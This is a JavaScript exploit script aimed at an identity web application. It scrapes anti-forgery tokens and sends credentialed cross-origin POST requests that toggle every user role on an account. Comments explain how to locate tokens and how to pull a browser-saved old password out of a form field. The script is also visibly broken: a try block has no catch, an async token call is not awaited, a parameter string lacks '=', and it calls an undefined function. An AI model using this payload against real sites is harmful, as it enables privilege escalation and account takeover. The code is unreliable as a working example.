//var newpassword = "ThisIsMyNewPassword!!123";
//var confirmPassword= "ThisIsMyNewPassword!!123";
var host = "https://identity.cybiquity.io";
var exploitendpoint = "/Organisation/ToggleUserRole/8c20a3df-b2de-4e0d-ad98-08dc0e02883a";   //this is the endpoint with functionality that can be changed - change variable bname if wish
//var tokenendpoint= "/Organisation/UserProfile/8c20a3df-b2de-4e0d-ad98-08dc0e02883a";  //this is the endpoint for grabbing token
var valuesendpoint = "/Organisation/UserProfile/8c20a3df-b2de-4e0d-ad98-08dc0e02883a#roles";
//var oldpassword;
var create_params;

var selector="document.querySelector('.toggleRole').id"

//this function uses a get request where you know the verification code is stored in the HTML
// In this scenario the /Manage/ChangePassword endpoint provides a token '__RequestVerificationToken'
// In order to find what the selector  right-click the node (token node) in Inspect, select Copy > Selector    
//Use that in document.querySelector() and just append .value
//can test manually in the console by doing doc.querySelector(selector given).value and this should show the token
//other option (poss easier) - document.querySelector('input[name="__RequestVerificationToken"]').value;
//wherer you know the name of the input name tag 

//In this scenario we also need the old password - this exploit is dependant on browsers used and whether they have been
//stored. Here the password can be retrieved via document.querySelector('input[id="OldPassword"]').value;


async function getPowers() {
    try {
        const response = await fetch(host+valuesendpoint); 
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const html = await response.text(); // Get the HTML content
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        
        const switchElements = document.querySelectorAll('.toggleRole');
        const switchArray = Array.from(switchElements);
       	//function handleSwitch(switchId) {
        //console.log(`Switch with ID ${switchId} is being processed.`);
        
        
   	 //}
	switchArray.forEach(switchElement => {
     
        const switchId = switchElement.id; 
        const token = getToken();   
        if(token){
        create_params = "__RequestVerificationToken"+ token + "&roleId=" + switchId ;
        send_modify();
        }   
        //handleSwitch(switchId); 
        });
        
        //const passFound = doc.querySelector(selector);
        
        

}

//getPowers().then(pass => {
 //   if (pass) {
   // 	oldpassword=pass;
     //   console.log('Token:', oldpassword);
        //create_params = "OldPassword=&NewPassword="+ emailaddress+"&FirstName=" + firstname + "&LastName=" + lastname + "&__RequestVerificationToken=" + token2 ;
       // getToken();
        
        // Do something with the token
    //} else {
      //  console.log('Failed to retrieve the token.');
   // }
//});



async function getToken() {
    try {
        const response = await fetch(host+valuesendpoint); 
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const html = await response.text(); // Get the HTML content
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const tokenInput = doc.querySelector('input[name="__RequestVerificationToken"]');

        if (tokenInput) {
            const token = tokenInput.value;
            return token;
        } else {
            throw new Error('Token input not found in the HTML.');
        }
    } catch (error) {
        console.error('Error:', error);
        return null;
    }
}




// checks whether valid or not and adds to the paramaters
//getToken().then(token => {
  //  if (token) {
    //	token2=token;
      //  console.log('Token:', token);
   
  //  } else {
    //    console.log('Failed to retrieve the token.');
   // }
//});


function send_modify() { 
  console.log("Changing Password..."); 
  fetch(host+exploitendpoint, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body : create_params }
  ).then(function(response2) {
    isdone();
  }); 
}

function isdone() { 
  console.log("Done"); 
  
}

getOldPassword();


